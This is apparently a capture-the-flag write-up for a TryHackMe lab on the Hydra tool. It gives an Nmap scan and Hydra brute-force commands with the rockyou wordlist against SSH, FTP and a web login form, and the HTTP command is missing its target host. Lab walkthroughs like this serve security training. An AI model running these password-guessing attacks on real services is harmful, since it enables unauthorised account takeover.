# Hydra Room - TryHackMe Writeup

## Overview
The Hydra room on TryHackMe teaches how to perform brute-force attacks on SSH, FTP, and HTTP services using the Hydra tool. It focuses on using the right wordlists and understanding login forms.

---

## Objectives / Tasks
- Scan open ports on the target
- Use Hydra to brute-force SSH, FTP, and HTTP login
- Find and submit the final flag

---

## Tools Used
- Nmap
- Hydra
- rockyou.txt wordlist

---

## Walkthrough

### Step 1: Scan open ports
Run an Nmap scan to identify services.
bash
nmap -sC -sV -oN nmap.txt <target_ip>

Result:

22/tcp (SSH)

21/tcp (FTP)

80/tcp (HTTP)



Step 2: Brute-force SSH with Hydra

hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<target_ip>



Step 3: Brute-force FTP with Hydra

hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<target_ip>



Step 4: Brute-force HTTP Login

hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/login:username=^USER^&password=^PASS^:Invalid username or password"



Step 5: Capture the flag

After successful login, search the home directory or web app.

cat /home/admin/user.txt



Flag

THM{example-flag-value}

## References  
- [Hydra GitHub](https://github.com/vanhauser-thc/thc-hydra)  
- [rockyou.txt wordlist](https://github.com/brannondorsey/naive-hashcat)  
- [TryHackMe Hydra Room](https://tryhackme.com/room/hydra)  
- [Nmap Documentation](https://nmap.org/book/man.html)  
- [Hydra Kali Docs](https://tools.kali.org/password-attacks/hydra)









